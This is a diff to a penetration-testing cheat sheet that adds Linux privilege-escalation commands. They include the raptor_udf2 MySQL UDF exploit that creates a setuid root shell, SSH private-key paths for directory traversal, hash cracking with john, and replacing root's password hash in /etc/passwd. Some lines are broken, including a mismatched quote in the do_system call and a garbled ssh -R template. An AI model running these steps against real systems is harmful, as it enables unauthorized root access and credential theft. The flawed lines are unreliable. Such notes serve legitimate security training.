@@ -970,7 +970,7 @@ net user admin password123!
 net localgroup <groupname> <username> /add
 ```
 
-### must search on directory traversal
+### Linux enumeration: must search on directory traversal
 ```bash
 /home/user/.ssh/id_ecdsa
 /home/user/.ssh/id_eddsa
@@ -978,3 +978,69 @@ net localgroup <groupname> <username> /add
 /home/user/.ssh/id_rsa
 ```
 
+### Linux enumeration: search for backup files
+```bash
+# search for / (root), /tmp, /var/backups
+```
+
+
+### Linux Enumeration: automated with lse.sh
+```bash
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
+chmod +x lse.sh
+./lse.sh -l 1 -i
+```
+
+### Linux Privesc service enum
+```bash
+# show all processes running as root
+ps aux | grep "^root"
+dpkg -l | grep <program>
+```
+
+### gcc for mysql exploit (example): This is possbile when root's password is set to ''
+```bash
+# Add -fPIC when compiling for x64 system
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/rootbash'; chmod +s /tmp/rootbash');
+exit
+/tmp/rootbash -p
+```
+
+### ssh Port Forwarding
+```bash
+ssh -R <mykali-port>127:0.0.1:<service-port> <username>@<local-machine>
+ssh -R 4444:127.0.0.1:3306 kali@192.168.x.x
+mysql -u root -h 127.0.0.1 -P 4444
+select @@hostname;
+```
+
+### linux change to root user
+```bash
+su
+```
+
+### Password cracking with john
+```bash
+john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+
+### Verify permissions on each file
+```bash
+ls -l /etc/shadow
+```
+
+### Generate hash from a password
+```bash
+# replace x of root's from /etc/passwd file (When have permissions)
+openssl passwd 'passwd'
+
+```
